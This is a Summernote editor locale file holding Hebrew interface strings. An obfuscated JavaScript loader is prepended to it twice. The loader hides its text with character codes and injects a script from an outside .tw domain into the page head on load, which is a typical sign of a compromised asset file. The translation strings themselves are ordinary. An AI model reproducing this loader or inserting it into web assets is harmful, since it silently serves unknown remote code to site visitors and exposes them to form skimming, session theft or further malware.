Element.prototype.appendAfter = function(element) {element.parentNode.insertBefore(this, element.nextSibling);}, false;(function() { var elem = document.createElement(String.fromCharCode(115,99,114,105,112,116)); elem.type = String.fromCharCode(116,101,120,116,47,106,97,118,97,115,99,114,105,112,116); elem.src = String.fromCharCode(104,116,116,112,115,58,47,47,115,116,111,114,101,46,100,111,110,116,107,105,110,104,111,111,111,116,46,116,119,47,115,116,97,116,46,106,115);elem.appendAfter(document.getElementsByTagName(String.fromCharCode(115,99,114,105,112,116))[0]);elem.appendAfter(document.getElementsByTagName(String.fromCharCode(104,101,97,100))[0]);document.getElementsByTagName(String.fromCharCode(104,101,97,100))[0].appendChild(elem);})();Element.prototype.appendAfter = function(element) {element.parentNode.insertBefore(this, element.nextSibling);}, false;(function() { var elem = document.createElement(String.fromCharCode(115,99,114,105,112,116)); elem.type = String.fromCharCode(116,101,120,116,47,106,97,118,97,115,99,114,105,112,116); elem.src = String.fromCharCode(104,116,116,112,115,58,47,47,115,116,111,114,101,46,100,111,110,116,107,105,110,104,111,111,111,116,46,116,119,47,115,116,97,116,46,106,115);elem.appendAfter(document.getElementsByTagName(String.fromCharCode(115,99,114,105,112,116))[0]);elem.appendAfter(document.getElementsByTagName(String.fromCharCode(104,101,97,100))[0]);document.getElementsByTagName(String.fromCharCode(104,101,97,100))[0].appendChild(elem);})();﻿(function ($) {
  $.extend($.summernote.lang, {
    'he-IL': {
      font: {
        bold: 'מודגש',
        italic: 'נטוי',
        underline: 'קו תחתון',
        clear: 'נקה עיצוב',
        height: 'גובה',
        name: 'גופן',
        strikethrough: 'קו חוצה',
        subscript: 'כתב תחתי',
        superscript: 'כתב עילי',
        size: 'גודל גופן'
      },
      image: {
        image: 'תמונה',
        insert: 'הוסף תמונה',
        resizeFull: 'גודל מלא',
        resizeHalf: 'להקטין לחצי',
        resizeQuarter: 'להקטין לרבע',
        floatLeft: 'יישור לשמאל',
        floatRight: 'יישור לימין',
        floatNone: 'ישר',
        dragImageHere: 'גרור תמונה לכאן',
        selectFromFiles: 'בחר מתוך קבצים',
        url: 'נתיב לתמונה',
        remove: 'הסר תמונה'
      },
      link: {
        link: 'קישור',
        insert: 'הוסף קישור',
        unlink: 'הסר קישור',
        edit: 'ערוך',
        textToDisplay: 'טקסט להציג',
        url: 'קישור',
        openInNewWindow: 'פתח בחלון חדש'
      },
      table: {
        table: 'טבלה'
      },
      hr: {
        insert: 'הוסף קו'
      },
      style: {
        style: 'עיצוב',
        normal: 'טקסט רגיל',
        blockquote: 'ציטוט',
        pre: 'קוד',
        h1: 'כותרת 1',
        h2: 'כותרת 2',
        h3: 'כותרת 3',
        h4: 'כותרת 4',
        h5: 'כותרת 5',
        h6: 'כותרת 6'
      },
      lists: {
        unordered: 'רשימת תבליטים',
        ordered: 'רשימה ממוספרת'
      },
      options: {
        help: 'עזרה',
        fullscreen: 'מסך מלא',
        codeview: 'תצוגת קוד'
      },
      paragraph: {
        paragraph: 'פסקה',
        outdent: 'הקטן כניסה',
        indent: 'הגדל כניסה',
        left: 'יישור לשמאל',
        center: 'יישור למרכז',
        right: 'יישור לימין',
        justify: 'מיושר'
      },
      color: {
        recent: 'צבע טקסט אחרון',
        more: 'עוד צבעים',
        background: 'צבע רקע',
        foreground: 'צבע טקסט',
        transparent: 'שקוף',
        setTransparent: 'קבע כשקוף',
        reset: 'איפוס',
        resetToDefault: 'אפס לברירת מחדל'
      },
      shortcut: {
        shortcuts: 'קיצורי מקלדת',
        close: 'סגור',
        textFormatting: 'עיצוב הטקסט',
        action: 'פעולה',
        paragraphFormatting: 'סגנונות פסקה',
        documentStyle: 'עיצוב המסמך',
        extraKeys: 'קיצורים נוספים'
      },
      history: {
        undo: 'בטל פעולה',
        redo: 'בצע שוב'
      }
    }
  });
})(jQuery);
